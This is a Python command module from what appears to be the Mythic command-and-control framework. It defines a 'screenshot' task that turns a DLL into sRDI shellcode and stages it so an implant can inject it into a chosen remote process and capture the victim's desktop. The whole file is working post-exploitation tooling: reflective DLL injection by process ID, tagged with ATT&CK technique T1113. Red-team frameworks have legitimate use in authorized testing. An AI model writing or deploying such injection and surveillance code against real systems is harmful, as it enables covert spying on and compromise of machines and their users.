from CommandBase import *
from uuid import uuid4
import json
from os import path
from MythicFileRPC import *
from sRDI import ShellcodeRDI


class ScreenshotArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
            "arch": CommandParameter(name="Architecture", type=ParameterType.String, choices=["x86", "x64"], description="Architecture of the remote process."),}

    async def parse_arguments(self):
        if not len(self.command_line):
            raise Exception("Usage: {}".format(ScreenshotCommand.help_cmd))

        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.strip().split(" ", maxsplit=2)
            valid_arch = ["x86", "x64"]
            if len(parts) != 2:
                raise Exception("Invalid command line arguments passed.\n\tUsage: {}".format(ScreenshotCommand.help_cmd))
            try:
                int(parts[0])
            except:
                raise Exception(f"Invalid PID passed to screenshot: {parts[0]}")
            self.add_arg("pid", int(parts[0]), ParameterType.Number)
            if parts[1] not in valid_arch:
                arches = ", ".join(valid_arch)
                raise Exception(f"Invalid architecture passed: {parts[1]}. Must be one of {arches}")
            self.add_arg("arch", parts[1])
        self.add_arg("pipe_name", str(uuid4()))
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot [pid] [x86/x64]"
    description = "Take a screenshot of the current desktop."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein")
    attackmapping = ["T1113"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        arch = task.args.get_arg("arch")
        dllFile = path.join(self.agent_code_path, f"Screenshot_{arch}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
        resp = await MythicFileRPC(task).register_file(converted_dll)
        if resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", resp.agent_file_id)
        else:
            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")
        task.args.remove_arg("arch")
        return task

    async def process_response(self, response: AgentResponse):
        pass